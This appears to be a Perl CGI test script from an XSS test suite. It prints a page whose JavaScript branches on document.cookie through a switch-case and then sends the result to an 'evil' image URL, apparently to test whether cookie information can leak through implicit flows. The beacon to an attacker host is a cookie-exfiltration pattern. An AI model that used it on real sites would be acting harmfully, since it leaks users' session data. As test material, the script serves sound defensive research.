#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Tests switch-case";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">

		var reportdut = "";
		
		// gets the number of arguments and add it to the reporting
		// variable "reportdut"
		
		var mycookie = 1;
		if ($evil) {
		  mycookie = 2;
		}

		var dut = "no cookie";

		var a = 2;
		
		switch (a) {
		  case 1: dut = 1;
		    break;
		  case mycookie: dut = 2;
		    break;
		  default: dut = 3;
		    break;
		}
		
		var url = "$imgevilurl?normal=" + dut;
		document.images[0].src = url;
		
    </script>
|;

require "xss_basic_footer.pl";
